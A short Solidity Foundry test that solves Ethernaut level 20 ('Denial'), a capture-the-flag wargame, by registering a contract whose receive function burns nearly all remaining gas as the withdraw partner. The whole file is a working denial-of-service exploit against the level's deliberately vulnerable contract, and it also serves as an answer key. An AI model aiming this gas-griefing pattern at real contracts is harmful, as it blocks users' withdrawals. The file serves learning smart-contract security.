pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract Fail {
    receive() external payable {
        // waste gas
        uint256 counter;
        while (gasleft() > 1000) counter++;
    }
}

contract Ethernaut20 is EthernautTest {
    constructor() EthernautTest(20) {}

    function solve() internal override(EthernautTest) {
        IDenial denial = IDenial(instance);
        Fail fail = new Fail();
        denial.setWithdrawPartner(address(fail));
    }

    receive() external payable {}
}
